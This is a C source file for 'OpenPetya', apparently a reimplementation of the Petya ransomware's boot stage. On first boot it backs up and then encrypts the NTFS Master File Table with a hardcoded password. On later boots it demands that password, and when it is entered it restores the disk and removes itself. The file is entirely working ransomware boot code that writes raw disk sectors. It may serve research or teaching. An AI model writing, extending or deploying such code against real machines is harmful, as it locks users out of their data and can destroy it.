// bootloader.c
// Standard libraries are not available, so they have to be purely implemented

#include "bootloader.h"
#include "io.h"
#include "keyboard.h"
#include "types.h"
#include "utils.h"
#include "ata.h"
#include "state.h"
#include "ntfs_crypt.h"
#include "hidden_store.h"

#define PASSWORD "123456"
#define MAX_ATTEMPTS 3
#define MAX_PW_LEN 32
#define PARTITION_LBA 2048UL

#define VGA_BASE ((volatile uint16_t *)0xB8000)
#define VGA_COLS 80
#define VGA_ROWS 25

// Reference: https://grokipedia.com/page/BIOS_color_attributes
#define COLOR_WHITE_ON_BLACK    0x07
#define COLOR_GREEN_ON_BLACK    0x0A
#define COLOR_CYAN_ON_BLACK     0x0B
#define COLOR_YELLOW_ON_BLACK   0x0E
#define COLOR_WHITE_ON_BLUE     0x1F
#define COLOR_WHITE_ON_RED      0x4F
#define COLOR_RED_ON_BLACK      0x0C
#define COLOR_DARKRED_ON_BLACK  0x04

// Global variables
static int cursor_row = 0;
static int cursor_col = 0;
static uint8_t current_color = COLOR_WHITE_ON_BLACK;

static void update_cursor(void)
{
    uint16_t pos = cursor_row * VGA_COLS + cursor_col;
    outb(0x3D4, 0x0F);
    outb(0x3D5, (uint8_t)(pos & 0xFF));
    outb(0x3D4, 0x0E);
    outb(0x3D5, (uint8_t)((pos >> 8) & 0xFF));
}

static void scroll(void)
{
    volatile uint16_t *vga = VGA_BASE;

    for (int row = 0; row < VGA_ROWS - 1; row++)
        for (int col = 0; col < VGA_COLS; col++)
            vga[row * VGA_COLS + col] = vga[(row + 1) * VGA_COLS + col];

    uint16_t blank = ' ' | ((uint16_t)current_color << 8);
    for (int col = 0; col < VGA_COLS; col++)
        vga[(VGA_ROWS - 1) * VGA_COLS + col] = blank;
    cursor_row = VGA_ROWS - 1;
}

static void itoa(uint32_t n, char *buf, int base)
{
    const char digits[] = "0123456789ABCDEF";
    char tmp[32];
    int i = 0;
    if (n == 0)
    {
        buf[0] = '0';
        buf[1] = '\0';
        return;
    }

    while (n > 0)
    {
        tmp[i++] = digits[n % base];
        n /= base;
    }

    int j = 0;
    while (i > 0)
        buf[j++] = tmp[--i];

    buf[j] = '\0';
}

static void draw_line(void)
{
    for (int i = 0; i < VGA_COLS; i++)
        vga_putchar('-');
}

static void get_cpu_vendor(char *out) {
    uint32_t ebx, ecx, edx;

    __asm__ volatile (
        "cpuid"
        : "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(0)
    );

    uint32_t *p = (uint32_t *)out;
    p[0] = ebx;
    p[1] = edx;
    p[2] = ecx;
    
    out[12] = '\0';
}

void vga_clear(void)
{
    volatile uint16_t *vga = VGA_BASE;
    uint16_t blank = ' ' | (COLOR_WHITE_ON_BLACK << 8);
    for (int i = 0; i < VGA_COLS * VGA_ROWS; i++)
        vga[i] = blank;
    cursor_row = cursor_col = 0;
    update_cursor();
}

void vga_putchar(char c)
{
    volatile uint16_t *vga = VGA_BASE;

    if (c == '\b')
    {
        if (cursor_col > 0)
        {
            cursor_col--;
        }
        else if (cursor_row > 0)
        {
            cursor_row--;
            cursor_col = VGA_COLS - 1;
        }

        vga[cursor_row * VGA_COLS + cursor_col] = ' ' | ((uint16_t)current_color << 8);
        update_cursor();

        return;
    }
    else if (c == '\n')
    {
        cursor_col = 0;
        cursor_row++;
    }
    else if (c == '\r')
    {
        cursor_col = 0;
    }
    else if (c == '\t')
    {
        cursor_col = (cursor_col + 8) & ~7;
    }
    else
    {
        vga[cursor_row * VGA_COLS + cursor_col] = (uint8_t)c | ((uint16_t)current_color << 8);
        cursor_col++;
    }

    if (cursor_col >= VGA_COLS) {
        cursor_col = 0;
        cursor_row++;
    }

    if (cursor_row >= VGA_ROWS)
        scroll();

    update_cursor();
}

void vga_puts(const char *s)
{
    while (*s)
        vga_putchar(*s++);
}

void vga_putchar_at(int row, int col, char c)
{
    volatile uint16_t *vga = VGA_BASE;

    if (row < 0 || row >= VGA_ROWS)
        return;

    if (col < 0 || col >= VGA_COLS)
        return;

    vga[row * VGA_COLS + col] = (uint8_t)c | ((uint16_t)current_color << 8);
}

void vga_draw_centered_ascii(const char *art)
{
    int lines = 1;
    int max_width = 0;
    int current_width = 0;

    for (const char *p = art; *p; p++)
    {
        if (*p == '\n')
        {
            if (current_width > max_width)
                max_width = current_width;

            current_width = 0;
            lines++;
        }
        else
        {
            current_width++;
        }
    }

    if (current_width > max_width)
        max_width = current_width;

    int start_row = (VGA_ROWS - lines) / 2;

    int row = start_row;

    const char *line_start = art;

    while (*line_start)
    {
        int line_len = 0;

        while (line_start[line_len] && line_start[line_len] != '\n')
        {
            line_len++;
        }

        int start_col = (VGA_COLS - line_len) / 2;

        for (int i = 0; i < line_len; i++)
        {
            vga_putchar_at(row, start_col + i, line_start[i]);
        }

        row++;

        line_start += line_len;

        if (*line_start == '\n')
            line_start++;
    }
}

void vga_set_color(uint8_t color)
{
    current_color = color;
}

void vga_put_dec(uint32_t n)
{
    char buf[16];
    itoa(n, buf, 10);
    vga_puts(buf);
}

void vga_put_hex(uint32_t n)
{
    char buf[16];
    vga_puts("0x");
    itoa(n, buf, 16);
    vga_puts(buf);
}

void wipe_out_bootloader(void)
{
    uint8_t zero[512] = { 0 };

    vga_puts("Removing the bootloader...\n");

    for (int i = 1; i <= 16; i++)
        ata_write(i, 1, zero);

    // Wipe state/tag/salt (sector 60-62)
    ata_write(60, 1, zero);
    ata_write(61, 1, zero);
    ata_write(62, 1, zero);

    vga_puts("Done.\n");
}

void do_encryption(void)
{
    vga_clear();

    vga_set_color(COLOR_WHITE_ON_BLUE);
    vga_puts("OpenPetya, 1st stage.");
    vga_set_color(COLOR_WHITE_ON_BLACK);
    vga_puts("\n\n");

    vga_set_color(COLOR_YELLOW_ON_BLACK);
    vga_puts("First boot detected. Setting up encryption...\n");
    vga_set_color(COLOR_WHITE_ON_BLACK);

    // Init hidden store with disk size from state sector
    uint64_t disk_size = state_read_disk_size();
    if (disk_size == 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: Disk size is not set by installer.\n");

        goto halt;
    }

    hidden_store_init(disk_size);

    vga_puts("[1/4] Backing up MFT to hidden area...\n");
    if (hidden_backup_mft(PARTITION_LBA) != 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: MFT bacup failed!\n");

        goto halt;
    }

    vga_puts("[2/4] Generating salt...\n");
    if (ntfs_generate_salt() != 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: Salt generation failed!\n");
        
        goto halt;
    }

    vga_puts("[3/4] Encrypting MFT...\n");
    if (ntfs_mft_encrypt(PASSWORD, PARTITION_LBA) != 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: MFT encryption failed!\n");

        goto halt;
    }

    vga_puts("[4/4] Saving state...\n");
    if (state_write(STATE_ENCRYPTED) != 0)
    {
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("ERROR: State save failed!\n");

        goto halt;
    }

    vga_set_color(COLOR_GREEN_ON_BLACK);
    vga_puts("\nSetup complete! Rebooting in 3 seconds...\n");
    
    sleep(3000);

    do_reboot();

halt:
    vga_set_color(COLOR_RED_ON_BLACK);
    vga_puts("\nSetup failed. System halted.\n");
    vga_puts("Re-install the bootloader to try again.\n");

     __asm__ volatile ("cli\n.Lhalt1: hlt\njmp .Lhalt1\n");
    __builtin_unreachable();
}

void login(void)
{
    vga_clear();

    vga_set_color(COLOR_WHITE_ON_BLUE);
    vga_puts("OpenPetya");
    vga_puts("\n\n");

    vga_set_color(COLOR_WHITE_ON_BLACK);

    char input[MAX_PW_LEN];
    int attempts = 0;

    while (attempts < MAX_ATTEMPTS)
    {
        vga_set_color(COLOR_YELLOW_ON_BLACK);
        vga_puts("Attempts remaining: ");
        vga_put_dec(MAX_ATTEMPTS - attempts);
        vga_putchar('\n');

        vga_puts("Password: ");
        keyboard_readline(input, MAX_PW_LEN);

        if (ntfs_mft_decrypt(input, PARTITION_LBA) == 0)
        {
            zero_buffer(input, MAX_PW_LEN);

            vga_set_color(COLOR_GREEN_ON_BLACK);
            vga_puts("\nAccess granted!\n\n");
            vga_set_color(COLOR_WHITE_ON_BLACK);

            uint64_t disk_size = state_read_disk_size();
            hidden_store_init(disk_size);

            vga_puts("[1/4] Restoring original MFT...\n");
            if (hidden_restore_mft(PARTITION_LBA) != 0)
            {
                vga_set_color(COLOR_RED_ON_BLACK);
                vga_puts("ERROR: MFT restore failed!\n");
                vga_puts("System halted to prevent data loss.\n");

                __asm__ volatile ("cli\n.Lhalt2: hlt\njmp .Lhalt2\n");
                __builtin_unreachable();
            }

            vga_puts("[2/4] Restoring original MBR...\n");
            uint8_t mbr_buffer[512];
            if (ata_read(63, 1, mbr_buffer) == 0)
            {
                uint8_t current[512]; // current partition table
                ata_read(0, 1, current);

                for (int i = 0; i < 446; i++)
                    current[i] = mbr_buffer[i];

                current[510] = 0x55;
                current[511] = 0xAA;

                ata_write(0, 1, current);
                vga_puts("Original MBR was restored.\n");
            }
            else
            {
                vga_puts("Warning: Could not read MBR backup.\n");
            }

            vga_puts("[3/4] Removing custom bootloader...\n");
            wipe_out_bootloader();
            hidden_wipe();

            uint8_t zero[512] = { 0 };
            ata_write(63, 1, zero);

            vga_set_color(COLOR_GREEN_ON_BLACK);
            vga_puts("\n[4/4] Booting Windows...\n");
            vga_puts("Custom bootloader has been removed.\n");

            sleep(3000);

            do_chainload();
        }

        zero_buffer(input, MAX_PW_LEN);
        vga_set_color(COLOR_RED_ON_BLACK);
        vga_puts("Wrong pasword.\n\n");
        vga_set_color(COLOR_WHITE_ON_BLACK);

        attempts++;
    }
}

void bootloader_main(uint32_t boot_drive)
{
    (void)boot_drive;

    uint8_t s = state_read();
    if (s == STATE_NOT_SETUP)
        do_encryption();
    else
        login();

    __builtin_unreachable();
}